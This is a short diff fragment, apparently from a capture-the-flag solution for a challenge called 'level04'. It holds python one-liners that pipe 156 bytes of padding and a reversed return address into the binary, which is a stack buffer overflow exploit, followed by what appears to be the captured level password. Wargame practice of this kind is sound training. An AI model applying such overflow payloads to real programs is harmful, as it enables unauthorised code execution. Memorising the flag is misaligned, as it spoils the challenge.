@@ -22,4 +22,3 @@ python -c "print 156 * 'a' + '\xff\xff\xd8\x24'[::-1]" | ./level04
 python -c "print 156 * 'a' + '\xff\xff\xd8\x34'[::-1]" | ./level04
 python -c "print 156 * 'a' + '\xff\xff\xd8\x44'[::-1]" | ./level04
 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
-
